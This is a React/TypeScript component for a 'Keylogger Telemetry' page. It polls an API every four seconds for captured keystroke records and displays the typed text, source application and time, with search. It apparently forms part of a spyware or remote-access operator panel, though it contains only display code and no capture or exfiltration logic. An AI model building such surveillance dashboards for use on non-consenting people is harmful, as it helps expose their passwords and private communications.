import { useEffect, useState, useMemo } from 'react';
import { PageTitle, Card, Dropdown } from '@/components/ui';
import { Search, RefreshCw } from 'lucide-react';
import { fetchKeylogs } from '@/lib/api';
import type { KeylogRecord } from '@/lib/api';

export function KeyloggerPage() {
  const [keylogs, setKeylogs] = useState<KeylogRecord[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [refreshKey, setRefreshKey] = useState(0);

  const loadKeylogs = async () => {
    try {
      const data = await fetchKeylogs();
      setKeylogs(data);
      setError(null);
    } catch {
      setError('Failed to fetch keylogger entries.');
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    loadKeylogs();
    const interval = setInterval(loadKeylogs, 4000);
    return () => clearInterval(interval);
  }, [refreshKey]);

  const filteredLogs = useMemo(() => {
    return keylogs.filter((k) =>
      k.app.toLowerCase().includes(searchQuery.toLowerCase()) ||
      k.text.toLowerCase().includes(searchQuery.toLowerCase())
    );
  }, [keylogs, searchQuery]);

  return (
    <div className="space-y-4">
      <PageTitle title="Keylogger Telemetry" />
      
      {error && <p className="text-xs text-red-400">{error}</p>}

      <div className="flex flex-wrap gap-2 justify-between items-center">
        <div className="flex gap-2">
          <Dropdown options={[{ value: 'all', label: 'All Applications' }]} value="all" placeholder="Filter app" aria-label="Filter app" />
        </div>
        
        <div className="flex gap-2">
          <div className="relative w-64">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
            <input 
              type="text" 
              placeholder="Search typed text..." 
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-9 pr-3 py-2 bg-[#0f172a] border border-slate-700 rounded-lg text-sm text-slate-300 placeholder-slate-500 focus:outline-none focus:border-emerald-500/50" 
            />
          </div>
          <button 
            type="button" 
            onClick={() => setRefreshKey(k => k + 1)}
            className="p-2 border border-slate-700 rounded-lg hover:bg-slate-900 text-slate-400"
          >
            {isLoading ? <RefreshCw className="w-4 h-4 animate-spin text-emerald-400" /> : <RefreshCw className="w-4 h-4" />}
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* App view */}
        <div className="space-y-3">
          <div className="text-xs text-slate-400 font-bold uppercase tracking-wider pl-1">Applications Activity</div>
          {filteredLogs.length === 0 ? (
            <Card className="p-8 text-center text-xs text-slate-500 italic border-slate-800 bg-[#020617]">No applications logs captured.</Card>
          ) : (
            filteredLogs.map((k, idx) => (
              <Card key={idx} className="p-3 bg-[#020617] border-slate-800 hover:border-slate-700 transition-colors">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded bg-[#090d1f] border border-slate-800 flex items-center justify-center text-xs font-bold text-emerald-400 font-mono">
                    {k.app.slice(0, 2).toUpperCase()}
                  </div>
                  <div>
                    <p className="text-sm font-semibold text-slate-200">{k.app}</p>
                    <p className="text-[10px] text-slate-500 font-mono">{k.time.replace("T", " ").slice(0, 19)}</p>
                  </div>
                </div>
              </Card>
            ))
          )}
        </div>

        {/* Typed Input view */}
        <div className="space-y-3">
          <div className="text-xs text-slate-400 font-bold uppercase tracking-wider pl-1">Keystroke Records</div>
          {filteredLogs.length === 0 ? (
            <Card className="p-8 text-center text-xs text-slate-500 italic border-slate-800 bg-[#020617]">No keyboard entries logged.</Card>
          ) : (
            filteredLogs.map((k, idx) => (
              <Card key={idx} className="p-3 bg-[#020617] border-slate-800 hover:border-slate-700 transition-colors flex flex-col justify-between">
                <p className="text-sm text-[#e5ffe5] font-mono whitespace-pre-wrap break-all">“{k.text}”</p>
                <div className="flex justify-between items-center mt-2 border-t border-slate-800/50 pt-1 text-[10px] text-slate-500">
                  <span className="font-semibold text-slate-400">{k.app} Input</span>
                  <span className="font-mono">{k.time.replace("T", " ").slice(11, 19)}</span>
                </div>
              </Card>
            ))
          )}
        </div>
      </div>
    </div>
  );
}
